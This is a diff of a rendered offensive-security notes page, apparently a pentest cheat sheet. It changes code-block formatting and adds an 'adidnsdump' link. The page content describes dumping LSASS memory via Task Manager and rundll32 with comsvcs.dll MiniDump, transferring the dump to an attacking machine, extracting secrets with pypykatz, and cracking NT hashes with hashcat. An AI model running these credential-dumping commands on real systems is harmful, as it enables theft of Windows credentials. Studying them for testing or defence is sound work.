@@ -683,6 +683,8 @@
       
         
       
+        
+      
     
     
     
@@ -765,6 +767,27 @@
   
   <span class="md-ellipsis">
     ADB
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../adidnsdump/" class="md-nav__link">
+        
+  
+  <span class="md-ellipsis">
+    adidnsdump
   </span>
   
 
@@ -17115,30 +17138,38 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
 <p>There are several methods to dump LSASS process memory.</p>
 <h3 id="1-task-manager-method">1. Task manager method</h3>
 <p>Open it. In Process tab, search for <code>Local Security Authority Process</code>. Click right on it and select <code>Create dump file</code>. A file called <code>lsass.DMP</code> is created and saved in:</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>C:\Users\loggedonusersdirectory\AppData\Local\Temp
-</span></code></pre></div>
+<div class="language-text highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-0-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1"></a>C:\Users\loggedonusersdirectory\AppData\Local\Temp
+</span></code></pre></div></td></tr></table></div>
 <p>Transfer file to attacking machine.</p>
 <h3 id="rundll32exe-comsvcsdll-method">Rundll32.exe &amp; Comsvcs.dll method</h3>
 <p>Modern anti-virus tools recognize this method as malicious activity.</p>
-<div class="language-powershell highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a><span class="c"># Finding LSASS PID in cmd</span>
-</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a><span class="n">tasklist</span> <span class="p">/</span><span class="n">svc</span>
-</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>
-</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4" href="#__codelineno-1-4"></a><span class="c"># Finding LSASS PID in PowerShell</span>
-</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5" href="#__codelineno-1-5"></a><span class="nb">Get-Process</span> <span class="n">lsass</span>
-</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6" href="#__codelineno-1-6"></a>
-</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7" href="#__codelineno-1-7"></a><span class="c"># Creating lsass.dmp using PowerShell</span>
-</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8" href="#__codelineno-1-8"></a><span class="n">rundll32</span> <span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="n">MiniDump</span> <span class="p">&lt;</span><span class="n">PID</span><span class="p">&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="n">full</span>
-</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9" href="#__codelineno-1-9"></a><span class="c"># With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). </span>
-</span></code></pre></div>
+<div class="language-powershell highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-1-1">1</a></span>
+<span class="normal"><a href="#__codelineno-1-2">2</a></span>
+<span class="normal"><a href="#__codelineno-1-3">3</a></span>
+<span class="normal"><a href="#__codelineno-1-4">4</a></span>
+<span class="normal"><a href="#__codelineno-1-5">5</a></span>
+<span class="normal"><a href="#__codelineno-1-6">6</a></span>
+<span class="normal"><a href="#__codelineno-1-7">7</a></span>
+<span class="normal"><a href="#__codelineno-1-8">8</a></span>
+<span class="normal"><a href="#__codelineno-1-9">9</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1"></a><span class="c"># Finding LSASS PID in cmd</span>
+</span><span id="__span-1-2"><a id="__codelineno-1-2" name="__codelineno-1-2"></a><span class="n">tasklist</span> <span class="p">/</span><span class="n">svc</span>
+</span><span id="__span-1-3"><a id="__codelineno-1-3" name="__codelineno-1-3"></a>
+</span><span id="__span-1-4"><a id="__codelineno-1-4" name="__codelineno-1-4"></a><span class="c"># Finding LSASS PID in PowerShell</span>
+</span><span id="__span-1-5"><a id="__codelineno-1-5" name="__codelineno-1-5"></a><span class="nb">Get-Process</span> <span class="n">lsass</span>
+</span><span id="__span-1-6"><a id="__codelineno-1-6" name="__codelineno-1-6"></a>
+</span><span id="__span-1-7"><a id="__codelineno-1-7" name="__codelineno-1-7"></a><span class="c"># Creating lsass.dmp using PowerShell</span>
+</span><span id="__span-1-8"><a id="__codelineno-1-8" name="__codelineno-1-8"></a><span class="n">rundll32</span> <span class="n">C</span><span class="p">:\</span><span class="n">windows</span><span class="p">\</span><span class="n">system32</span><span class="p">\</span><span class="n">comsvcs</span><span class="p">.</span><span class="n">dll</span><span class="p">,</span> <span class="n">MiniDump</span> <span class="p">&lt;</span><span class="n">PID</span><span class="p">&gt;</span> <span class="n">C</span><span class="p">:\</span><span class="n">lsass</span><span class="p">.</span><span class="n">dmp</span> <span class="n">full</span>
+</span><span id="__span-1-9"><a id="__codelineno-1-9" name="__codelineno-1-9"></a><span class="c"># With this command, we are running rundll32.exe to call an exported function of comsvcs.dll which also calls the MiniDumpWriteDump (MiniDump) function to dump the LSASS process memory to a specified directory (C:\lsass.dmp). </span>
+</span></code></pre></div></td></tr></table></div>
 <p>Transfer file to attacking machine.</p>
 <h3 id="3-pypykatz">3. Pypykatz</h3>
 <p>pypykatz parses the secrets hidden in the LSASS process memory dump.</p>
-<div class="language-bash highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>/home/path/lsass.dmp<span class="w"> </span>
-</span></code></pre></div>
+<div class="language-bash highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-2-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1"></a>pypykatz<span class="w"> </span>lsa<span class="w"> </span>minidump<span class="w"> </span>/home/path/lsass.dmp<span class="w"> </span>
+</span></code></pre></div></td></tr></table></div>
 <h2 id="crack-the-file">Crack the file</h2>
 <h3 id="cracking-the-nt-hash-with-hashcat">Cracking the NT Hash with Hashcat</h3>
-<div class="language-shell-session highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="go">sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt</span>
-</span></code></pre></div>
+<div class="language-shell-session highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span><span class="normal"><a href="#__codelineno-3-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1"></a><span class="go">sudo hashcat -m 1000 hash /usr/share/wordlists/rockyou.txt</span>
+</span></code></pre></div></td></tr></table></div>
 
 <!-- This section adds support for localized revision dates -->
 
@@ -17214,7 +17245,7 @@ https://github.com/mkdocs/mkdocs/blob/master/mkdocs/themes/mkdocs/content.html -
     </div>
     
     
-    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
+    <script id="__config" type="application/json">{"base": "..", "features": ["navigation.instant", "navigation.top", "navigation.indexes", "navigation.path", "navigation.tab", "content.code.annotate", "content.code.copy", "content.code.select", "search.suggest", "search.highlight", "codehilite", "code-blocks"], "search": "../assets/javascripts/workers/search.6ce7567c.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
     
     
       <script src="../assets/javascripts/bundle.88dd0f4e.min.js"></script>
